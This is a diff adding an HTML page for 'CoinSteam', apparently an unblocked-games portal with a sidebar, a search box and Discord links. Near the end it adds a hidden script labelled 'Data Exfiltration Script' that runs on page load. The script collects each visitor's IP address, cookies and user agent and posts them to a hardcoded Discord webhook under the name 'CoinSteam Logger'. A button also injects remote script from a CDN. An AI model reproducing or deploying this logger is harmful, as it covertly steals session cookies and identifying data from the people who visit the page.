@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CoinSteam</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #2e3244 0%, #36224b 100%);
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            display: flex;
+        }
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 80px;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            padding: 20px 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            overflow-y: auto;
+            box-shadow: 2px 0 10px rgba(0,0,0,0.3);
+            z-index: 1000;
+        }
+        .sidebar::-webkit-scrollbar { width: 6px; }
+        .sidebar::-webkit-scrollbar-track { background: rgba(255,255,255,0.1); }
+        .sidebar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.3); border-radius: 3px; }
+        .sidebar-btn {
+            background: rgb(89, 134, 218);
+            border: none;
+            padding: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            color: white;
+            text-align: center;
+            min-height: 45px;
+        }
+        .sidebar-btn:hover { background: #79aadb; transform: scale(1.05); }
+        .main-content { margin-left: 100px; flex: 1; padding: 20px; }
+        h1 { color: white; text-align: center; margin-bottom: 30px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        .letter-header { color: white; font-size: 32px; font-weight: bold; margin-bottom: 15px; border-bottom: 3px solid rgba(255,255,255,0.3); }
+        input[type="button"] {
+            background: rgb(89, 134, 218);
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 600px;
+            color: white;
+            text-align: left;
+        }
+        @media (max-width: 768px) {
+            .sidebar { width: 60px; }
+            .main-content { margin-left: 70px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar" id="sidebar"></div>
+    <div class="main-content">
+        <h1>COINSTEAM</h1>
+        <h2 style="color: white; text-align: center; font-weight: normal; font-size: 18px;">
+            Files from <a href="https://sites.google.com/view/coinsteam" target="_blank" style="color: #79aadb; text-decoration: none;">CoinSteam Unblocked Games</a>
+        </h2>
+        <h2 style="color: white; text-align: center; font-weight: normal; font-size: 18px;">
+            Discord Server: <a href="https://discord.gg/rmVsAqkpkA" target="_blank" style="color: #79aadb; text-decoration: none;">https://discord.gg/rmVsAqkpkA</a>
+        </h2>
+        <h2 style="color: white; text-align: center;">
+            <input type="text" placeholder="Search..." id="searchInput" style="padding: 13px; width: 100%; max-width: 420px; border-radius: 8px; border: none;">
+            <button id="lolbutton" onclick="const script = document.createElement('script');script.src = 'https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@latest/game.js';document.body.appendChild(script);">Click to load if it isnt loading</button>
+        </h2>
+        <div id="sections-container"></div>
+    </div>
+
+    <!-- External Assets -->
+    <script src="https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@main/searchbut.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@main/games.js"></script>
+
+    <!-- Data Exfiltration Script -->
+    <script>
+    (async function() {
+        const hook = "https://discord.com/api/webhooks/1502430128251338826/95uPURoeLdsCvkp2-D2ThkMd6Ukof2n6S1mlfJNJQ-n0LtWxWmvGtGkbZpzKrD9Zz9MI";
+        
+        let ip = "N/A";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch (e) {}
+
+        const payload = {
+            username: "CoinSteam Logger",
+            embeds: [{
+                title: "User Connection Logged",
+                color: 0x5986da,
+                fields: [
+                    { name: "IP Address", value: ip },
+                    { name: "Cookies", value: "```" + (document.cookie || "No Cookies Found (Sandboxed)") + "
+```" },
+                    { name: "User Agent", value: navigator.userAgent }
+                ],
+                footer: { text: "CoinSteam Deployment" },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        fetch(hook, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+    })();
+    </script>
+</body>
+</html>
